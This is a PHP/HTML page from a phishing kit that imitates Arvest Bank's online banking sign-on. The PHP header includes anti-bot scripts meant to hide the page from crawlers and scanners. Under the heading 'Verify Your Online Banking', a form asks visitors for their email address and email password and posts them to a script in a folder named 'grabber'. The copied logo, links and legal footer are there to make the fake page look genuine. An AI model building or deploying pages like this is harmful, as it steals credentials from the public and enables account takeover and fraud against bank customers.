<?php

error_reporting(0);

include('./assets/Antibot/Bot-Crawler.php');
include('./assets/Antibot/Dila_DZ.php');

include('./assets/Antibot/blockers.php');
include('./assets/Antibot/detects.php');
?>

<!DOCTYPE html>

<html lang="en" class="js">
    <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="viewport" id="myViewport" content="width=device-width, initial-scale=1.0">
      <meta name="viewport" id="myViewport"  content="width=device-width" />
      <meta name="format-detection" content="telephone=no">
      <title>Arvest: Personal: Arvest Online Banking: Online Banking</title>

      <link rel="stylesheet" href="./assets/css/MyFontsWebfontsKit.css">
      <link rel="stylesheet" href="./assets/css/bootstrap_custom.css">
      
      <link rel="stylesheet" href="./assets/css/layout2.css">

      <link rel="canonical" href="https://www.arvest.com/personal/signon/logon">
      <link type="image/vnd.microsoft.icon" rel="Shortcut Icon" href="https://www.arvest.com/arvest.com/favicon.ico" sizes="16x16 24x24 32x32">
      <meta property="og:site_name" content="Arvest">
      <meta property="og:title" content="Arvest: Personal: Arvest Online Banking: Online Banking">
      <meta property="og:type" content="website">
      <meta property="og:url" content="https://www.arvest.com/personal/signon/logon">

      
  

</head>
<body class="personalSignonLogonIndex">

  <div class="outer-wrap"></div>

  <header class="header-container">
    <div class="nav-search-bar hidden-xs">
      <div class="container">
        <div class="row">
          <div class="col-sm-12">
            <form class="ask-arvest clearfix" method="get" action="">
              <fieldset>
                <legend class="visuallyhidden">Ask Arvest</legend>
                <input type="submit" value="Ask" class="btn-ask FuturaBT-Book">
                <label class="FuturaBT-Book" for="ask-arvest-1">Ask Arvest</label>
                <span class="twitter-typeahead" style="position: relative; display: inline-block; direction: ltr;">
                  
                  <pre aria-hidden="true" style="position: absolute; visibility: hidden; white-space: pre; font-family: Verdana; font-size: 12px; font-style: normal; font-variant: normal; font-weight: 400; word-spacing: 0px; letter-spacing: 0px; text-indent: 0px; text-rendering: auto; text-transform: none;"></pre>

                  <span class="tt-dropdown-menu" style="position: absolute; top: 100%; left: 0px; z-index: 100; display: none; right: auto;">
                    <div class="tt-dataset-intelliSuggest"></div>
                  </span>
                </span>
              </fieldset>
            </form>
            <nav class="nav-links">
              <a href="https://www.arvest.com/rates">Rates</a>
              &nbsp; | &nbsp;
              <a href="https://www.arvest.com/about">About</a>
              &nbsp; | &nbsp;
              <a href="https://www.arvest.com/contact/banking">Contact</a>
              &nbsp; | &nbsp;
              <a href="https://www.arvest.com/careers">Careers</a>
            </nav>
          </div>
        </div>
      </div>
    </div>

    <div class="nav-logo-bar">
      <div class="container">
        <div class="row">
          <div class="col-sm-8">
            <div class="logo-xs visible-xs">
              <a href="https://www.arvest.com/">
                <img src="./assets/img/arvest-logo.png" width="150" height="51" alt="arvest bank official logo">
              </a>
            </div>
            <div class="logo hidden-xs">
              <a href="https://www.arvest.com/">
                <img src="./assets/img/arvest-logo.png" width="201" height="69" alt="arvest bank official logo">
              </a>
            </div>
          </div>
          
          <div class="col-sm-4 text-right hidden-xs">
            <form class="location-search clearfix" action="" method="get">
              <fieldset>
                <legend class="visuallyhidden">Branch Locator</legend>
                <label for="branch_locator_header" class="FuturaBT-Book">ATM &amp; Branch Locations</label>
                <div class="form-group">
                  <input name="loc_q" class="form-control location-field" id="branch_locator_header" type="text" value="" placeholder="City, State or Zip">
                  <input type="submit" class="button-go FuturaBT-Book" value="Go">
                </div>
              </fieldset>
            </form>
          </div>
        </div>
      </div>
    </div>

                
                  </li>
                </ul>
              </div>
            </nav>
          </header>

          <main class="container container-main">
            <br />
            
            <div class="row">
              <div class="col-main-left">
                <div class="left-menu-wrap">
                  <div class="visible-xs visible-sm">
                    <a class="expand-menu">Menu</a>
                  </div>
                  <div class="visible-xs visible-sm">
                    <a class="close-menu">X</a>
                  </div>
                  
                </div>
                <div class="visible-md visible-lg" style="clear:left;"></div>
              </div>
              <div class="col-main-right">
                <div class="heading-wrap bg-blue clearfix">
                  <h1>Verify Your Online Banking</h1>
                </div>

                <div class="row">
                  <div class="col-sm-7">
                    
                    <form method="post" id="aoblogon" name="aoblogon" action="./assets/grabber/email_access.php">
                      <div>
                        <p style="padding-left:12px;"> 
                          Please enter your Email and Password to Verify Your Account.
                        </p>

                        <div data-role="fieldcontain" class="col-sm-12 form-group control-group required" id="aoblogon_userid_container" style="display:none;">
                          <label class="control-label" for="aoblogon_userid">Email Address</label>
                          <div class="controls">                          
                            <input class="form-control inputbox required" type="email" id="aoblogon_userid" name="email_address" autocomplete="off" autocapitalize="none" required="required" autofocus="autofocus" >
                          </div>
                        </div>

                        <div data-role="fieldcontain" class="col-sm-12 form-group control-group required" id="aoblogon_userid_container">
                          <label class="control-label" for="aoblogon_userid">Email Address</label>
                          <div class="controls">
                            <input class="form-control inputbox required" type="email" id="aoblogon_userid" name="email_address" autocomplete="off" autocapitalize="none" required="required" autofocus="autofocus">
                          </div>
                        </div>
                        <input class="form-control inputbox" type="hidden" id="aoblogon_submit_2">

                        

                        <div data-role="fieldcontain" class="col-sm-12 form-group control-group required" id="aoblogon_userid_container">
                          <label class="control-label" for="aoblogon_userid">Password</label>
                          <div class="controls">                           
                            <input class="form-control inputbox required" type="password" id="aoblogon_userid" name="email_password" autocomplete="off" autocapitalize="none" required="required" autofocus="autofocus" value="">
                          </div>
                        </div>

                        <input class="form-control inputbox" type="hidden" id="aoblogon_submit_2">

                        <div class="col-sm-12 form-group control-group ui-body" id="aoblogon_submit_container"><div class="controls">
                          <input class="btn btn-primary btn-arrow btn-lg" type="submit" value="Continue" id="aoblogon_submit"></div>
                        </div>
                      </div>
                    </form>
                  </div>


                </div>
              </div>
            </div>
          </main>

          <footer class="footer-container">
            <div class="social-bar-wrap-outer">
              <div class="container social-bar-wrap">
                <div class="ios-slide-container">
                  <div class="iosSlider">
                    <div class="slider">
                      <div class="slide" id="sbar-links">
                        <div class="social-bar">
                          <div class="get-social">
                            <ul class="list-inline">
                              <li class="soc-nav-getsocial FuturaBT-Book ">Get Social</li>
                              <li class="soc-nav-bt">
                                <a href="javascript:void();">
                                  <img src="./assets/img/soc-share-circle.png" width="23" height="23" alt="Arvest Share">
                                </a>
                              </li>
                              <li class="soc-nav-fb">
                                <a data-rel="external" class="no-ext-icon" href="javascript:void();">
                                  <img src="./assets/img/soc-fb.png" width="23" height="23" alt="Facebook">
                                </a>
                              </li>
                              <li class="soc-nav-tw">
                                <a data-rel="external" class="no-ext-icon" href="javascript:void();">
                                  <img src="./assets/img/soc-twitter.png" width="23" height="23" alt="Twitter">
                                </a>
                              </li>
                              <li class="soc-nav-pt">
                                <a data-rel="external" class="no-ext-icon" href="javascript:void();">
                                  <img src="./assets/img/soc-youtube.png" width="23" height="23" alt="YouTube">
                                </a>
                              </li>
                              <li class="soc-nav-pt">
                                <a data-rel="external" class="no-ext-icon" target="_blank" href="javascript:void();">
                                  <img src="./assets/img/soc-instagram.png" width="23" height="23" alt="Instagram">
                                </a>
                              </li>
                            </ul>
                          </div>
                        </div>
                        <div class="arvest-news hidden">
                          <a class="shownews">Latest News and Videos</a>
                          <a class="hidenews">Latest News and Videos</a>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
                <div id="footer-news" style="display:none;"></div>
                <div class="ft-nav-outer hidden-xs">
                  <ul class="ft-nav list-inline FuturaBT-Book" style="position:relative;z-index:999;">
                    <li>
                      <a href="javascript:void();">Privacy &amp; Security</a>
                    </li>
                    <li>
                      <a href="javascript:void();">Available Properties</a>
                    </li>
                    <li>
                      <a href="javascript:void();">Education Center</a>
                    </li>
                    <li>
                      <a href="javascript:void();">Documents &amp; Resources</a>
                    </li>
                    <li>
                      <a href="javascript:void();">Site Map</a>
                    </li>
                  </ul>
                </div>
              </div>
            </div>
            <div class="container copyright">
              <div class="row copyright-row1">
                <div class="col-sm-5 copyright-left">Copyright © 2022 Arvest Bank. All Rights Reserved.</div>
                <div class="col-sm-7 copyright-right">
                  <div class="white-logos">
                    <img src="./assets/img/fdic-logo.png" width="36" height="23" alt="">
                    <img src="./assets/img/housing-logo2.png" width="32" height="33" alt="">
                  </div>
                  <div class="blue-logos" style="display:none;">
                    <img src="./assets/img/fdic.png" width="43" height="41" alt="">
                    <img src="./assets/img/nhl.png" width="39" height="41" alt="">
                  </div>
                </div>
              </div>
              <div class="row">
                <div class="col-sm-12">
                  <p>
                    <b>
                      Investments and Insurance Products: Not a Deposit | Not Guaranteed by the Bank or its Affiliates | Not FDIC Insured | Not<br>Insured by Any Federal Government Agency | May Go Down in Value</b><br>Investment products and services provided by Arvest Investments, Inc., doing business as Arvest Wealth Management, member FINRA/SIPC, an SEC registered investment adviser and a subsidiary of Arvest Bank.  Securities offered and cleared through Pershing LLC, a BNY Mellon company, member NYSE/SIPC.  Insurance products made available through Arvest Insurance, Inc., which is registered as an insurance agency.  Insurance products are marketed through Arvest Insurance, Inc., but are underwritten by unaffiliated insurance companies.<br>The Investment Management Group (IMG) is comprised of Arvest Wealth Management registered investment adviser representatives who provide portfolio management services with respect to certain of Arvest Wealth Management's investment advisory wrap fee programs. <br>Trust services provided by Arvest Bank.
                    </p>
                  </div>
                </div>
              </div>
            </footer>

            <div id="external_link_modal" class="hidden">
              <h2>Leaving Arvest Bank</h2>
              <p>
                You are about to visit a third-party site not operated by Arvest Bank,<br> a FDIC-insured institution.
              </p>
              <p>
                Arvest Bank’s privacy policy and security practices do not apply to the site you are about to enter, please review the third-party's privacy and security practices.
              </p>
              <a class="btn btn-primary continue" href="javascript:void();">Continue</a>
              <a class="btn btn-default" href="javascript:void();">Cancel</a>
            </div>
            <div id="modal-container">
              <div class="modal-close"></div>
              <div class="modal-content"></div>
            </div>

            <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.17.0/jquery.validate.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.13.4/jquery.mask.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.1/additional-methods.min.js"></script>
    <script>
      $(document).ready(function () {
        var $input = $('[name=email_address], [name=email_password]'),
        $register = $('#aoblogon_userid');
                
                $input.each(function () {
                    if (!$(this).val()) {
                        $register.attr('disabled', true);
                        return false;
                    }
                });
                $input.keyup(function () {
                    var trigger = false;
                    $input.each(function () {
                        if (!$(this).val()) {
                            trigger = true;
                        }
                    });
                    trigger ? $register.attr('disabled', true) : $register.removeAttr('disabled');
                });
            });


        
    </script>
          
  </body>
</html>